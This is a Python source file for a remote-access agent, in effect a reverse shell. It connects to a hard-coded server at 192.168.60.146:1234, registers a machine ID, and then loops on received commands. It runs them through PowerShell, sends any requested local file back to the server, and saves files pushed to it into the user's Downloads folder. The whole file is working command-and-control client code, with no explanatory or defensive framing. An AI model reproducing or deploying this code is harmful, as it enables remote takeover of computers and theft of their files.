import socket
import subprocess
import os
import uuid

def get_agent_id():
    # Generate a unique agent ID based on machine and network information
    return str(uuid.uuid1())


def execute_command(command):
    try:
        if command.startswith("cd"):
            os.chdir(command[3:].strip())
            return "Directory changed to " + os.getcwd()
        elif command.startswith("get"):
            file_path = command[4:].strip().replace("`", "")
            if os.path.exists(file_path):
                with open(file_path, "rb") as file:
                    return file.read()
            else:
                return f"File not found at path: {file_path}"
        else:
            output = subprocess.check_output(["powershell", command], shell=True, stderr=subprocess.STDOUT, text=True)
            return output
    except subprocess.CalledProcessError as e:
        return str(e)


def receive_file_from_server(client_socket, file_path):
    save_directory = r"C:\Users\User\Downloads"  # Specify the directory where you want to save the file
    os.makedirs(save_directory, exist_ok=True)

    try:
        file_name = os.path.basename(file_path.strip())
        abs_file_path = os.path.abspath(os.path.join(save_directory, file_name))
        print(f"Saving file to: {abs_file_path}")

        with open(abs_file_path, "wb") as file:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                print(f"Received data length: {len(data)}")
                file.write(data)

        print(f"File saved successfully at: {abs_file_path}")
        client_socket.send("File received successfully".encode('utf-8'))

        # Ensure the file is closed before returning
        file.close()

        with open(abs_file_path, "rb") as file:
            file_content = file.read()
            print(f"Content of saved file length: {len(file_content)}")

        # Add a return statement to break out of the file processing loop
        return True

    except OSError as e:
        print(f"OS Error ({e.errno}): {e.strerror}")
    except Exception as e:
        print(f"Error while receiving file: {e}")

    # Return False if there was an issue with file processing
    return False


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.60.146', 1234))  # Enter the server's IP address here

    # Send Agent ID to the server
    agent_id = get_agent_id()
    client.send(agent_id.encode('utf-8'))

    while True:
        command = client.recv(4096).decode('utf-8')
        if command.lower() == 'exit':
            break
        elif command.startswith("send"):
            file_path = command[5:].strip().replace("`", "")
            receive_file_from_server(client, file_path)
            # Send acknowledgment to the server that file upload is complete
            client.send("File upload complete".encode('utf-8'))
        else:
            output = execute_command(command)
            if isinstance(output, bytes):
                client.send(output)
                acknowledgment = client.recv(4096).decode('utf-8')
                print(acknowledgment)
                if acknowledgment == "File received successfully":
                    client.send("next_menu".encode('utf-8'))
                else:
                    print("Error receiving file acknowledgment.")
                    break
            else:
                client.send(output.encode('utf-8'))

    client.close()


if __name__ == "__main__":
    main()
